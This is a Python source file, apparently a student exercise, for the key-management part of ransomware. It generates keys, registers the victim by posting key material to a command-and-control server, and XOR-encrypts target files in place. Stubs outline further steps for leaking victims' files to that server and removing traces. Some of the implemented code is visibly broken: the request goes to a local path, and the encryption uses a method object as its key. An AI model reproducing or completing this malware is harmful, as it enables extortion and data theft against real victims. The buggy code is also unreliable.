from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        #raise NotImplemented()
        kdf = PBKDF2HMAC (
            algorithm = hashes.SHA256(),
            length = self.KEY_LENGTH,
            salt = salt,
            iterations = self.ITERATION,
        )
        clef_derivee = kdf.derive(key)
        return clef_derivee


    def create(self)->Tuple[bytes, bytes, bytes]:
        #raise NotImplemented()
        # création aléatoire du salt et de la clef 
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.KEY_LENGTH)
        # Hashage du salt et de la clef avec l'algorithme sha256
        hashed_salt = sha256(salt).digest()
        hashed_key = sha256(key).digest()
        # Dérivation de la clef
        derived_key = self.do_derivation(hashed_salt, hashed_key)
        return salt, hashed_key, derived_key


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        # convertir les données binaires en base64 pour l'envoi dans le corps de la requête
        payload = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key)
        }
        # envoyer la requête POST au CNC
        response = requests.post(f"{self._path}/new", json=payload)
        # vérifier que la requête a été effectuée avec succès
        if response.status_code != 201:
            raise ValueError("Failed to send secret data to CNC")
        #raise NotImplemented()

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        # On vérifie si les fichiers cryptographiques exixtes, sinon on les cré
        os.makedirs(self._path, exist_ok = True)
        salt, key, token = self.create()

        with open(os.path.join(self._path, "salt.bin"), "wb") as f :
            f.write(salt)
        
        with open (os.path.join(self._path, "token.bin"), "wb") as f :
            f.write(token)

        derived_key = self.do_derivation(salt, key)

        self.post_new (salt, derived_key, token)

        #raise NotImplemented()

    def load(self)->None:
        # function to load crypto data
       # with open(os.path.join(self._path, "salt.bin"), "rb") as f :
            #self._salt = f.read()

        #with open(os.path.join(self._path, "token.bin"), "rb") as f :
            #self._token = f.read()
        raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        with open(os.path.join(self._path, "token.bin"), "rb") as f :
            token = f.read()
        hashed_token = sha256(token).hexdigest()
        return hashed_token
        #raise NotImplemented()

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for file in files :
            with open (file, "rb") as f :
                plaintext = f.read()

            # Chiffrement des fichiers en utilisant la clef
            encrypted = bytes([p ^ k for p, k  in zip(plaintext, self.check_key)])

            # Réecriture des données chiffrées dans le même fichier
            with open (file, "wb") as f :
                f.write(encrypted)

#        raise NotImplemented()

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()